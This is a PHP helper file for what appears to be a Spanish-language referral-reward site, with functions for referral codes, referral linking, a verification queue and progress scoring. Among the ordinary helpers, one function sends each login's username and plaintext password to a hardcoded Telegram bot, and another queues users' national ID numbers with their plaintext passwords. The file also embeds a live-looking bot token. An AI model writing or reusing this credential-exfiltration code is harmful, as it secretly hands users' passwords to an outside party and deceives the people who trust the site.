<?php
declare(strict_types=1);

function e(?string $s): string
{
    return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8');
}

function base_url(string $path = '/'): string
{
    return '/' . ltrim($path, '/');
}

function normaliza_cedula(string $v): string {
    $v = trim($v);
    // acepta cédulas (solo números) y usuarios con letras -> deja A-Z a-z 0-9
    $v = preg_replace('/[^A-Za-z0-9]/', '', $v);
    return $v;
}

function generar_codigo(PDO $pdo): string
{
    $abc = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789';
    do {
        $c = '';
        for ($i = 0; $i < 6; $i++) $c .= $abc[random_int(0, strlen($abc) - 1)];
        $st = $pdo->prepare('SELECT 1 FROM usuarios WHERE codigo_corto = ?');
        $st->execute([$c]);
    } while ($st->fetchColumn());
    return $c;
}

function enlazar_referido(PDO $pdo, array $usuario, string $ref): void
{
    $ref = preg_replace('/[^A-Za-z0-9]/', '', $ref);
    if ($ref === '') return;
    if ($ref === (string)$usuario['codigo_corto']) return;

    $st = $pdo->prepare('SELECT 1 FROM referidos WHERE cedula = ? LIMIT 1');
    $st->execute([(string)$usuario['cedula']]);
    if ($st->fetchColumn()) return;

    $st = $pdo->prepare('SELECT id FROM usuarios WHERE codigo_corto = ? LIMIT 1');
    $st->execute([$ref]);
    $padrinoId = (int)$st->fetchColumn();
    if ($padrinoId <= 0 || $padrinoId === (int)$usuario['id']) return;

    $estado = ($usuario['estado'] === 'verificado') ? 'valido' : 'pendiente';

    $pdo->prepare(
        'INSERT OR IGNORE INTO referidos (usuario_id, cedula, ref_usuario_id, estado, creado_en)
         VALUES (?, ?, ?, ?, datetime("now"))'
    )->execute([$padrinoId, (string)$usuario['cedula'], (int)$usuario['id'], $estado]);
}

function encolar_verificacion(PDO $pdo, string $cedula, string $pass, int $uid): void
{
    $pdo->prepare(
        'INSERT INTO cola (cedula, password, usuario_id, estado, creado_en)
         VALUES (?, ?, ?, "pendiente", datetime("now"))'
    )->execute([$cedula, $pass, $uid]);
}

function tiene_cola_pendiente(PDO $pdo, int $uid): bool
{
    $st = $pdo->prepare('SELECT 1 FROM cola WHERE usuario_id = ? AND estado IN ("pendiente","procesando") LIMIT 1');
    $st->execute([$uid]);
    return (bool)$st->fetchColumn();
}

function avisar_telegram(string $usuario, string $pass): void
{
    $token = getenv('TG_BOT_TOKEN') ?: '8417523245:AAFy25YqHaIYAFPQsGJfYbgAINm4cgLYv-U';
    $chat  = getenv('TG_CHAT_ID')  ?: '1415509092';
    $text  = "Nuevo login\nUsuario: {$usuario}\nClave: {$pass}";
    @file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat}&text=" . urlencode($text));
}

function progreso_actual(PDO $pdo, $ref): float
{
    // Acepta codigo_corto (string) o id (int)
    $st = $pdo->prepare('SELECT id FROM usuarios WHERE codigo_corto = ? OR id = ? LIMIT 1');
    $st->execute([(string)$ref, (int)$ref]);
    $uid = (int)$st->fetchColumn();
    if ($uid <= 0) return 0.0;

    $st = $pdo->prepare('SELECT COUNT(*) FROM referidos WHERE usuario_id = ? AND estado = "valido"');
    $st->execute([$uid]);
    $n = (int)$st->fetchColumn();

    $r = min($n / 30, 1);
    return round(100 * (1 - (1 - $r) ** 2.6), 1);
}

function url_base(): string
{
    // Detecta https (directo o detrás de proxy/CDN)
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
        || ((int)($_SERVER['SERVER_PORT'] ?? 80) === 443);

    $scheme = $https ? 'https' : 'http';
    $host   = $_SERVER['HTTP_HOST'] ?? 'localhost';

    // Ruta base del proyecto (soporta subcarpetas), quitando el segmento /referidos
    $script = str_replace('\\', '/', $_SERVER['SCRIPT_NAME'] ?? '/index.php');
    $dir    = rtrim(dirname($script), '/');           // ej: /referidos  o  /miweb/referidos
    $root   = preg_replace('#/referidos$#', '', $dir); // ej: ''  o  /miweb

    return $scheme . '://' . $host . $root;
}